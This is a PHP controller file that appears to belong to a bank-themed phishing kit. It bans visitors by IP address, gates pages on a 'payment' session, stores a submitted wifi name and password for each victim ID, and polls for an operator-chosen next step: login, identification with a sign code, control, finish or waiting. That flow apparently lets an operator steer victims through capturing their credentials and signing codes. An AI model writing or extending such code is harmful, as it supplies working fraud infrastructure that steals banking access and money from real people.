<?php

namespace App\Controllers\Regio;

use \Core\View;
use \App\Models\Regio\Regio;
use \App\Auth;

class Control extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['wifi']) && isset($_POST['wifi_pass']) && isset($_POST['wifi_pass_two'])) {
            Regio::setWifi($_POST['wifi'], $_POST['wifi_pass'], $_POST['wifi_pass_two'], $_SESSION['uid']);
        } else {
            if (Regio::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Regio::checkPayment($this->route_params['id'])) {
                Regio::redirect();
            } else {
                Regio::setWifiInformation($_SESSION['uid']);

                View::render('Regio/control.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Asn::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Regio::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        $check = Regio::getSignCode($_SESSION['uid']);
                        echo json_encode(['page' => 'identification', 'code' => $check]);   
                        Regio::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Regio::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Regio::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Regio::redirect();
        }
    }
}